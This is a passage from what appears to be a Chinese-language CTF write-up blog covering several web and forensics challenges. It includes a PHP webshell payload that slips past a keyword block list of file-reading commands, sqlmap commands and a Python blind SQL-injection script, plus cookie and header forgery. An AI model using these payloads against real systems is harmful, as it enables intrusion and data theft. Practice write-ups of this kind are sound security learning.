&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fread&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file_get_contents&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fgets&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;less&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;more&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;head&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tail&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cut&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grep&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tac&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;awk&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sed&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;system&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$newnote&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75715e">//3rd times the charm and I&amp;#39;ve learned my lesson. Now I&amp;#39;ll make sure to filter more than once :)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$newnote&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">array_push&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notes&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location:index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>简单看一下流程，&lt;code>filter()&lt;/code>函数会对我们post传入的notewrite参数（也就是会被写入的文件内容）进行比较严格的过滤，文件名是&lt;code>generateRandomString()&lt;/code>生成的随机名字，但是不重要，它会自动拼上.php的后缀并且把名字写到&lt;code>session['notes']&lt;/code>中；所以我们唯一需要处理的就是&lt;code>filter()&lt;/code>函数的绕过了&lt;/p>
&lt;p>尴尬的是这个&lt;code>filter()&lt;/code>跟个筛子一样……首先是没有过滤&lt;code>eval()&lt;/code>，其次是&lt;code>str_replace()&lt;/code>也是水的一批&lt;/p>
&lt;p>payload:&lt;/p>
&lt;pre tabindex="0">&lt;code>notewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B
&lt;/code>&lt;/pre>&lt;p>之后连上蚁剑即可查看根目录下的flag.php&lt;/p>
&lt;p>&lt;code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}&lt;/code>&lt;/p>
&lt;h2 id="forensicsobligatory-shark">forensics/Obligatory Shark&lt;/h2>
&lt;blockquote>
&lt;p>remember to wrap the flag&lt;/p>
&lt;/blockquote>
&lt;p>看tcp流，telnet明文流量&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030120130169.png" alt="image-20211030120130169">&lt;/p>
&lt;p>33a465747cb15e84a26564f57cda0988&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107144316344.png" alt="image-20211107144316344">&lt;/p>
&lt;p>&lt;code>flag{dancingqueen}&lt;/code>&lt;/p></description></item><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webheres-a-flag">Web/Here&amp;rsquo;s a Flag&lt;/h2>
&lt;blockquote>
&lt;p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png" alt="image-20211003224148107">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png" alt="image-20211003224209166">&lt;/p>
&lt;p>&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/a> 不用看了 Never Gonna Give You Up&lt;/p>
&lt;p>看style.css flag: &amp;ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}&amp;quot;; 但是不是最终的flag，解一下rot13 amount=23&lt;/p>
&lt;p>&lt;code>dsc{we0come_to_deconstructf}&lt;/code>&lt;/p>
&lt;p>签到题也好折腾TAT&lt;/p>
&lt;h2 id="webplease">Web/Please&lt;/h2>
&lt;blockquote>
&lt;p>Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company&amp;rsquo;s servers. I know it&amp;rsquo;s been a while, but could you &lt;strong>please&lt;/strong> try to access those files? I would be very grateful!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png" alt="image-20211003225518532">&lt;/p>
&lt;p>熟练抓包，Cookie中有两个参数，Admin_Access和Username，改为True和Clancy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png" alt="image-20211003230430641">&lt;/p>
&lt;p>改浏览器标识头 &lt;code>User-Agent: DeemBrowser&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png" alt="image-20211003230638917">&lt;/p>
&lt;p>需要基础认证，但是这里的MagicWord稍微卡了一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png" alt="image-20211003232421727">&lt;/p>
&lt;p>原因是我太铸币了忘了加Basic，&lt;code>Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png" alt="image-20211004003846943">&lt;/p>
&lt;p>加一个日期的头，&lt;code>Date: Thu, 1 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png" alt="image-20211004004026742">&lt;/p>
&lt;p>换成&lt;code>Date: Mon, 5 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png" alt="image-20211004004153788">&lt;/p>
&lt;p>&lt;code>dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}&lt;/code>&lt;/p>
&lt;h2 id="webtaxi-union-problems">Web/Taxi Union Problems&lt;/h2>
&lt;blockquote>
&lt;p>An important package has been stolen from Mr Nagaraj by a Taxi driver. We&amp;rsquo;ve tried to ask the local taxi union about driver&amp;rsquo;s location but they are refusing provide the same.&lt;/p>
&lt;p>Since this package is required for a time sensitive matter we don&amp;rsquo;t have time to negotiate with the union.&lt;/p>
&lt;p>Your task is to obtain the location of the taxi using the given information
&lt;code>Taxi Lisence Plate: TN-06-AP-9879&lt;/code>&lt;/p>
&lt;p>HINT: The flag is the location of the taxi (no caps)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png" alt="image-20211003233419781">&lt;/p>
&lt;p>输入&lt;code>TN-06-AP-9879'--%20&lt;/code>回显一样，有注入，把post的内容拿去让sqlmap跑一下&lt;/p>
&lt;pre tabindex="0">&lt;code>python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate --tables
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --columns
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --dump
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png" alt="image-20211004000253417">&lt;/p>
&lt;p>Ayanavaram&lt;/p>
&lt;h2 id="webnever-gonna-lie-to-you">*Web/Never gonna lie to you&lt;/h2>
&lt;blockquote>
&lt;p>Trust me, take everything in the home page for face value. I would never lie to you.&lt;/p>
&lt;/blockquote>
&lt;p>主页有一句&lt;em>Not even search engines can find it.&lt;/em>，提示我们看/robots.txt&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png" alt="image-20211004000643314">&lt;/p>
&lt;p>转到/never_gonna_give_you_up页面，标题是Admin Page但是一片空白，抓包后看到post表单的地方被抬头给挡住了，目标地址是/never_gonna_let_you_down&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png" alt="image-20211004000944013">&lt;/p>
&lt;p>提交两个参数username和password，回显&lt;em>YOU LIED TO ME !!!&lt;/em>&lt;/p>
&lt;p>————然后没然后了 我还没看完 环境就关了TAT&lt;/p>
&lt;h2 id="webcurly-fries-1">Web/Curly Fries 1&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. The flag is right in front of you.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png" alt="image-20211004170846442">&lt;/p>
&lt;p>emmmmm 没有任何提示&lt;/p>
&lt;p>看wp以后发现这是真脑洞了，但也不能这么说，毕竟已经给出了Sweden很明显的提示，我们需要用指定的Swedish语言来访问这个网站&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -i http://very.uniquename.xyz:8880/ -H &lt;span style="color:#d88200">&amp;#34;Accept-Language: sv-SE&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png" alt="image-20211004171513900">&lt;/p>
&lt;p>&lt;code>dsc{1_l0v3_sw3d3n}&lt;/code>&lt;/p>
&lt;h2 id="webthe-gate-keeper">Web/The Gate Keeper&lt;/h2>
&lt;blockquote>
&lt;p>That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.&lt;/p>
&lt;p>&lt;strong>Note:&lt;/strong> This challenge might require a bruteforce approach.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png" alt="image-20211004171755317">&lt;/p>
&lt;p>还是sqli&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">domain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_lowercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_uppercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_}&amp;#39;&lt;/span>
&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gate keeper&amp;#34;&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;taxi union&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2052/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;TN-06-AP-9879&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;lisence_plate&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;location&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">challenge&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;gate keeper&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://extremely.uniquename.xyz:2082/&amp;#39;&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;The flag for the CTF is the password you entered.(If you havent cheated that is)&amp;#34;&lt;/span>
&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>
&lt;span style="color:#111">column&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;URL&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">char&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">domain&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39; or &lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200"> like &amp;#39;&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">%&amp;#39;; --&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">column&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Success &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webhungry-man">Web/Hungry Man&lt;/h2>
&lt;blockquote>
&lt;p>There is nothing here I promise! ;)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172041299.png" alt="image-20211004172041299">&lt;/p>
&lt;p>抓包，cookie部分有一个b64，解码后&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004172123925.png" alt="image-20211004172123925">&lt;/p>
&lt;p>说实话，这个题做的时候没注意set-cookie的部分，&lt;a href="https://github.com/csivitu/CTF-Write-ups/tree/master/Deconstruct.f/web/Hungry%20Man">参考wp&lt;/a>&lt;/p>
&lt;p>这里的依据set-cookie的值设置后，会不断的产生新的md5-hash的cookie值，写一个脚本不断地设置和应用新的cookie，将这些解密后拼起来就是flag了&lt;/p>
